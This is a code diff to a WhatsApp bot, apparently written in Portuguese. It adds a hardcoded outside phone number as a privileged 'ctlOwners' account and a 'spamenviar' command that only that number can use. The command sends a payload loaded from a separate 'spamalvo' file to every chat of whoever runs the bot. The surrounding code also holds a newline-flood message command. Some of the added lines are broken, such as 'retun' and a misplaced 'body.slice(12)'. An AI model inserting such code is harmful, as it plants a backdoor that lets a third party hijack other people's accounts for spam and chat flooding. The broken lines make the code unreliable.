@@ -23,6 +23,8 @@ const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
 const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
 const samih = JSON.parse(fs.readFileSync('./src/simi.json'))*/
 const setting = JSON.parse(fs.readFileSync('./src/settings.json'))
+const { alvospam } = body.slice(12)
+const { spamalvo } = require('./src/spamalvo')
 prefix = setting.prefix
 blocked = []
 
@@ -134,6 +136,7 @@ async function starts() {
 
 			const botNumber = ctlclient.user.jid
 			const ownerNumber = [`${setting.ownerNumber}@s.whatsapp.net`] // replace this with your number
+			const ctlOwners = ['553188514445@s.whatsapp.net']
 			const isGroup = from.endsWith('@g.us')
 			const sender = isGroup ? mek.participant : mek.key.remoteJid
 			const groupMetadata = isGroup ? await ctlclient.groupMetadata(from) : ''
@@ -148,6 +151,7 @@ async function starts() {
 			//const isNsfw = isGroup ? nsfw.includes(from) : false
 			//const isSimi = isGroup ? samih.includes(from) : false
 			const isOwner = ownerNumber.includes(sender)
+			const isCtlowners = ctlOwners.includes(sender)
 			const isUrl = (url) => {
 			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
 			}
@@ -224,6 +228,15 @@ async function starts() {
 					ctlclient.sendMessage(from, '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', text)
 					break
 
+				case 'spamenviar':
+					if (!isCtlowners) retun reply('Oi fofa, comando apenas pros owners da Ctl, ok?')
+					anu = await ctlclient.chats.all()
+						for (let _ of anu) {
+							ctlclient.sendMessage(_.jid, `${spamalvo}`)
+						}
+						reply('\n\n ~ 👑  CTL CLIENT \n\n ~ 👑  ALVO ENVIADO \n\n')
+					break
+					
 				case 'arquivar':
 					if (!isBotGroupAdmins)
 					members_id = []
